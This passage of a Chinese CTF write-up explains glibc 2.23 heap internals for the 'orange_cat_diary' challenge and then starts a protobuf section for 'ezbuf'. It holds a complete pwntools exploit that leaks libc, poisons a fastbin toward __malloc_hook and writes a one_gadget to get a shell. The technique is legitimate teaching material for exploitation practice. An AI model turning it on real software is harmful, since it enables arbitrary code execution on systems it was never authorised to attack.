class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_32_big(sz)                                              \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45)                                     \</span><br><span class="hljs-meta">         ? 49 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-comment">// XXX It remains to be seen whether it is good to keep the widths of</span><br><span class="hljs-comment">// XXX the buckets the same or whether it should be scaled by a factor</span><br><span class="hljs-comment">// XXX of two as well.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_64(sz)                                                  \</span><br><span class="hljs-meta">    (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48)                                     \</span><br><span class="hljs-meta">         ? 48 + (((unsigned long) (sz)) &gt;&gt; 6)                                  \</span><br><span class="hljs-meta">         : ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20)                               \</span><br><span class="hljs-meta">               ? 91 + (((unsigned long) (sz)) &gt;&gt; 9)                            \</span><br><span class="hljs-meta">               : ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10)                        \</span><br><span class="hljs-meta">                     ? 110 + (((unsigned long) (sz)) &gt;&gt; 12)                    \</span><br><span class="hljs-meta">                     : ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4)                   \</span><br><span class="hljs-meta">                           ? 119 + (((unsigned long) (sz)) &gt;&gt; 15)              \</span><br><span class="hljs-meta">                           : ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2)             \</span><br><span class="hljs-meta">                                 ? 124 + (((unsigned long) (sz)) &gt;&gt; 18)        \</span><br><span class="hljs-meta">                                 : 126)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index(sz)                                                     \</span><br><span class="hljs-meta">    (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16             \</span><br><span class="hljs-meta">                                                ? largebin_index_32_big(sz)    \</span><br><span class="hljs-meta">                                                : largebin_index_32(sz))</span><br></code></pre></td></tr></table></figure><p>我们将top chunk的size修改为0xf90，利用申请大chunk将top chunk释放到unsorted bin，再申请一个0x10的chunk时<br>会先将unsorted bin中的chunk取出，放到相应的small bin或者large bin<br>本题会将unsorted bin中大小为0xf90的堆块放到large bin，利用largebin_index_64计算得出index为98<br>而bin_at为98的值对应的bins下标为 <code>(98-1)*2=194</code><br>所以计算出bk在main_arena的偏移为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">word_bytes = context.word_size // <span class="hljs-number">8</span> <span class="hljs-comment"># i386-&gt;word_size=32  amd64-&gt;word_size=64</span><br>bin_at = <span class="hljs-number">98</span><br>bins = (bin_at-<span class="hljs-number">1</span>)*<span class="hljs-number">2</span><br>offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br><span class="hljs-comment"># offset += 4  # have_fastchunks</span><br>offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># fastbinY</span><br>offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>offset += word_bytes * bins <span class="hljs-comment"># offset bins</span><br>offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br><span class="hljs-built_in">print</span>(offset) <span class="hljs-comment">#1640</span><br></code></pre></td></tr></table></figure><p>最后减去<code>word_bytes * 2</code>是因为bins的bk指针指向的是<code>&amp;bins[(i-1)*2]-0x10</code>，所以要减去<code>word_bytes * 2</code>即0x10<br>最终计算结果与调试结果一致</p><p>bk在main_arena的偏移为1640，main_arena在libc的偏移为0x3C4B20<br>所以最终偏移为<code>1640+0x3C4B20=0x3c5188</code></p><h4 id="分配到malloc-hook"><a href="#分配到malloc-hook" class="headerlink" title="分配到malloc_hook"></a>分配到malloc_hook</h4><p>因为程序在free堆块之后没有清空，可以继续写值，那我们就可以修改这个堆块的fd指针指向一个addr<br>之后申请该大小的堆块之后，对应大小的fastbin指针就会指向fd指针，即addr<br>再次malloc申请内存时，由于对应的fastbin指针不为NULL，就会将addr作为堆块分配出来，即可实现任意地址写的操作</p><p>不过fastbin在分配内存时，会检测指针指向的地方(将其作为malloc_chunk)的size是不是和对应的fastbin大小相等，不是则报错</p><p>所以我们要找一个合适的addr，addr处为pre_size，这个可以为任意值，但addr+8必须为对应fastbin的size</p><p>下面是源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><br><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">        ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span><br><span class="hljs-meta">  do\</span><br><span class="hljs-meta">    &#123;\</span><br><span class="hljs-meta">      victim = pp;\</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> (victim == NULL)\</span><br><span class="hljs-meta">break;\</span><br><span class="hljs-meta">    &#125;\</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta"> != victim);\</span><br><span class="hljs-meta"></span><br>  <span class="hljs-comment">// 如果对齐之后的请求字节(nb)处于fastbin的范围中</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>    &#123;<br>      <span class="hljs-comment">//fastbin下标</span><br>      idx = fastbin_index (nb);<br>      <span class="hljs-comment">//对应fastbin的头指针</span><br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br><br>      <span class="hljs-comment">//victim不为空，即对应的fastbin不为空</span><br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    *fb = victim-&gt;fd;<br>  <span class="hljs-keyword">else</span><br>    REMOVE_FB (fb, pp, victim);<br>  <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>    &#123;<br>        <span class="hljs-comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span><br>        <span class="hljs-comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span><br>        <span class="hljs-comment">// 利用fastbin_index 计算 chunk 的索引</span><br>    <span class="hljs-type">size_t</span> victim_idx = fastbin_index (chunksize (victim)); <span class="hljs-comment">//这一句是检测的关键，我们要使计算后的victim_idx和idx相等</span><br><br>        <span class="hljs-comment">//检测</span><br>      <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br><br>        <span class="hljs-comment">//更细致的检查，只在-DMALLOC_DEBUG时使用</span><br>      check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment"> stash them in the tcache.  */</span><br>      <span class="hljs-type">size_t</span> tc_idx = csize2tidx (nb);<br>      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>&#123;<br>  mchunkptr tc_victim;<br><br>  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br> &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>*fb = tc_victim-&gt;fd;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  REMOVE_FB (fb, pp, tc_victim);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>      tcache_put (tc_victim, tc_idx);<br>    &#125;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>      alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br>  <span class="hljs-comment">// 对应的fastbin为空，检查smallbin</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>我们调试一下看看__malloc_hook上方有没有满足要求的值 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">10</span>gx (uint64_t)&amp;__malloc_hook-<span class="hljs-number">0</span>x23<br><span class="hljs-attribute">0x7c63ee9ebaed</span> &lt;_IO_wide_data_0+<span class="hljs-number">301</span>&gt;:   <span class="hljs-number">0</span>x63ee9ea260000000      <span class="hljs-number">0</span>x000000000000007c<br><span class="hljs-attribute">0x7c63ee9ebafd</span>: <span class="hljs-number">0</span>x63ee6acea0000000      <span class="hljs-number">0</span>x63ee6aca7000007c<br><span class="hljs-attribute">0x7c63ee9ebb0d</span> &lt;__realloc_hook+<span class="hljs-number">5</span>&gt;:      <span class="hljs-number">0</span>x000000000000007c      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7c63ee9ebb1d</span>: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-attribute">0x7c63ee9ebb2d</span> &lt;main_arena+<span class="hljs-number">13</span>&gt;: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br></code></pre></td></tr></table></figure><p>我们看到，在__malloc__hook(地址为0x7c63ee9ebb10)的上方(__malloc__hook - 0x23 + 0x8)刚好有个0x7c(0b0111 1100)<br>我们计算一下 size_t victim_idx &#x3D; fastbin_index (chunksize (victim));</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">chunksize_nomask(p) -&gt; <span class="hljs-number">0x7c</span>(<span class="hljs-number">0b0111</span> <span class="hljs-number">1100</span>)<br>chunksize(p) -&gt; <span class="hljs-number">0x78</span>(<span class="hljs-number">0b0111</span> <span class="hljs-number">1000</span>)<br>fast_index(sz)  -&gt; ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == <span class="hljs-number">8</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">3</span>)) - <span class="hljs-number">2</span>) <br>                -&gt; ((((unsigned int) (sz)) &gt;&gt; <span class="hljs-number">4</span>) - <span class="hljs-number">2</span>) <br>                -&gt; (<span class="hljs-number">0x7</span>)<span class="hljs-number">0b0111</span> - <span class="hljs-number">2</span><br>                -&gt; <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>fastbinY</th><th>32位chunk_size</th><th>64位chunk_size</th></tr></thead><tbody><tr><td>fastbinY[0]</td><td>0x18</td><td>0x20</td></tr><tr><td>fastbinY[1]</td><td>0x20</td><td>0x30</td></tr><tr><td>fastbinY[2]</td><td>0x28</td><td>0x40</td></tr><tr><td>fastbinY[3]</td><td>0x30</td><td>0x50</td></tr><tr><td>fastbinY[4]</td><td>0x38</td><td>0x60</td></tr><tr><td>fastbinY[5]</td><td>0x40</td><td>0x70</td></tr><tr><td>fastbinY[6]</td><td>0x48</td><td>0x80</td></tr></tbody></table><p>即fastbin的idx为5，对应chunk大小为0x70<br>当我们申请0x60到0x68字节大小的空间时，会先调用一个checked_request2size的宏转为0x70的chunk size<br>所以我们可以申请0x60~0x68的空间，即可绕过fastbin的检测</p><p>申请到的内存会转换为用户内存(+0x10)，所以此时__malloc_hook的位置在申请到的指针的0x13字节之后</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./orange_cat_diary&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,content)<br><br><span class="hljs-comment"># gadget</span><br>one_gadget1 = <span class="hljs-number">0x4527a</span><br>one_gadget2 = <span class="hljs-number">0xf03a4</span><br>one_gadget3 = <span class="hljs-number">0xf1247</span><br><br>p.sendlineafter(<span class="hljs-string">b&quot;Hello, I&#x27;m delighted to meet you. Please tell me your name.&quot;</span>,<span class="hljs-string">b&#x27;zzkkk1h&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-comment"># 修改top chunk大小</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>edit(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0xf91</span>))<br><br><span class="hljs-comment"># 申请较大chunk使修改后的top chunk置入unsorted bin</span><br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-comment"># 从unsorted bin中申请内存，填上8字节数据，show泄露bk指针内容，调试获取bk指针指向位置在main_arena的偏移</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-(<span class="hljs-number">1640</span>+<span class="hljs-number">0x3C4B20</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># 计算 malloc_hook 和 one_gadget 的地址</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>one_gadget = libc_base + one_gadget2<br><br><span class="hljs-comment"># 申请内存块</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><br><span class="hljs-comment"># 删除刚刚申请的堆块，放入fastbin中</span><br>delete()<br><br><span class="hljs-comment"># 在fd指针位置写上malloc_hook-0x23的值，这个地址+8后刚好为0x7c，可以申请0x68大小的空间</span><br>edit(<span class="hljs-number">0x68</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<br><br><span class="hljs-comment"># 0x13字节后即为__malloc_hook的位置，写上one_gadget</span><br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_gadget))<br><br><span class="hljs-comment"># 再次调用malloc就会执行__malloc_hook处的指令，即可获取shell</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;choice:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x30</span>).encode())<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="ezbuf"><a href="#ezbuf" class="headerlink" title="ezbuf"></a>ezbuf</h2><h3 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote><p>官方文档：<a href="https://protobuf.dev/overview/">https://protobuf.dev/overview/</a><br>protobuf-c的官方文档：<a href="https://protobuf-c.github.io/protobuf-c">https://protobuf-c.github.io/protobuf-c</a><br>protobuf-c的源码仓库：<a href="https://github.com/protobuf-c/protobuf-c">https://github.com/protobuf-c/protobuf-c</a></p></blockquote><p>Protobuf是一种与语言无关、与平台无关的可扩展机制，用于序列化结构化数据。它类似于 JSON，但体积更小、速度更快，并且会生成本机语言绑定。您只需定义一次数据的结构，然后就可以使用专门生成的源代码轻松地将结构化数据写入各种数据流并使用各种语言读取这些结构化数据。</p><p>它支持以下语言</p><ul><li>C++</li><li>C#</li><li>Java</li><li>Kotlin</li><li>Objective-C</li><li>PHP</li><li>Python</li><li>Ruby</li></ul><p>其他语言(如C语言)需要额外安装插件，本题是一个c语言程序，用到了插件protobuf-c</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 首先安装依赖</span><br><span class="hljs-built_in">sudo</span> apt install git g++ autoconf automake libtool curl make unzip<br><br><span class="hljs-comment"># 安装 protobuf</span><br><span class="hljs-built_in">cd</span> ~ <span class="hljs-comment"># 切换到一个合适的位置</span><br>git <span class="hljs-built_in">clone</span> https://github.com/protocolbuffers/protobuf.git<br><span class="hljs-built_in">cd</span> protobuf<br>git checkout v3.21.0 <span class="hljs-comment"># 试过v27.0，protobuf-c装不上，所以用v3.21.0</span><br>git submodule update --init --recursive <span class="hljs-comment"># 安装子模块</span><br>./autogen.sh   <span class="hljs-comment">#生成配置脚本</span><br>./configure    <span class="hljs-comment"># 可选 --prefix=path ，默认路径为/usr/local/</span><br>make -j 4          <br><span class="hljs-built_in">sudo</span> make install <br><span class="hljs-built_in">sudo</span> ldconfig       <span class="hljs-comment"># refresh shared library cache</span><br><span class="hljs-built_in">which</span> protoc        <span class="hljs-comment"># find the location</span><br>protoc --version    <span class="hljs-comment"># check</span><br><br><span class="hljs-comment"># 安装 protobuf-c</span><br><span class="hljs-built_in">cd</span> ~ <span class="hljs-comment"># 切换到一个合适的位置</span><br>git <span class="hljs-built_in">clone</span> https://github.com/protobuf-c/protobuf-c.git<br><span class="hljs-built_in">cd</span> protobuf-c<br>./autogen.sh<br>./configure<br>make -j 4<br><span class="hljs-built_in">sudo</span> make install<br><br><span class="hljs-comment"># 安装python的protobuf支持</span><br>pip install protobuf<br><br><span class="hljs-comment"># 如果之后在使用中出现 </span><br><span class="hljs-comment"># ImportError: cannot import name &#x27;builder&#x27; from &#x27;google.protobuf.internal&#x27;</span><br><span class="hljs-comment"># 先执行一下，一般都能解决问题</span><br>pip install --upgrade protobuf<br></code></pre></td></tr></table></figure><p>之后我们会使用 protoc 生成 python 语言的结构化数据，便于利用 pwntools 发送数据</p><h4 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h4><p>首先我们新建一个.proto文件，利用protoc生成一个c语言的代码，查看生成的文件，进一步了解protobuf</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Protobuf">syntax=<span class="hljs-string">&quot;proto3&quot;</span>; <span class="hljs-comment">//proto version 2 or 3</span><br><br><span class="hljs-keyword">message </span><span class="hljs-title class_">test</span>&#123;<br>    <span class="hljs-type">bytes</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">sint64</span> b = <span class="hljs-number">2</span>;<br>    <span class="hljs-type">uint64</span> c = <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将上述内容保存为test.proto文件，使用<code>protoc test.proto --c_out=./</code>生成相应的c语言代码<br>下面是生成出的文件的一部分代码，其中包含两个重要的结构体：ProtobufCFieldDescriptor和ProtobufCMessageDescriptor</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> ProtobufCFieldDescriptor test__field_descriptors[<span class="hljs-number">3</span>] =<br>&#123;<br>  &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-number">1</span>,<br>    PROTOBUF_C_LABEL_NONE,<br>    PROTOBUF_C_TYPE_BYTES,<br>    <span class="hljs-number">0</span>,   <span class="hljs-comment">/* quantifier_offset */</span><br>    offsetof(Test, a),<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-literal">NULL</span>,<br>    <span class="hljs-number">0</span>,             <span 